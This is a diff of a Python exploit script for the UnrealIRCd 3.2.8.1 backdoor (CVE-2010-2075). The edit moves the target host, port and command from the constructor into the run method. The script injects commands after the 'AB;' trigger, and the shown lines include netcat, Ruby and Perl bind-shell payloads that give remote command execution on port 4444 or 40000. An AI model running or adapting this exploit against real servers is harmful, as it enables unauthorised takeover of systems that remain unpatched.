@@ -2,15 +2,15 @@
 
 import argparse
 import socket
-from _thread import *
+from thread import *
 
 
 class UnrealExploit:
-    def __init__(self, host, port, cmd):
+    def __init__(self):
         self.__sock = None
-        self.__host = host
-        self.__port = port
-        self.__cmd = f"AB; {cmd}"
+        self.__host = None
+        self.__port = None
+        self.__cmd = None
         self.netcat = b"AB; mkfifo /tmp/xnfkexe; (nc -l -p 4444 ||nc -l 4444)0</tmp/xnfkexe | /bin/sh >/tmp/xnfkexe 2>&1; rm /tmp/xnfkexe"
         self.bindruby = b"AB; ruby -rsocket -e 'exit if fork;s=TCPServer.new(\"40000\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'"
         self.bindperl = b"AB; perl -MIO -e '$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};'"
@@ -45,7 +45,10 @@ class UnrealExploit:
         self.__sock.close()
         self.__listen()
 
-    def run(self):
+    def run(self, host, port, cmd):
+        self.__host = host
+        self.__port = port
+        self.__cmd = f"AB; {cmd}"
         self.__connect()
         return self.__exploit()
 
@@ -55,8 +58,8 @@ def main(args):
     print("[+] Unreal 3.2.81 Backdoor (CVE-2010-2075) by xentrick")
     print("[+] Exploiting " + args.host + ":" + args.port)
 
-    exploit = UnrealExploit(args.host, int(args.port), args.cmd)
-    if exploit.run():
+    exploit = UnrealExploit()
+    if exploit.run(args.host, int(args.port), args.cmd):
         print("Target exploited")
     else:
         print("Exploit failed.")
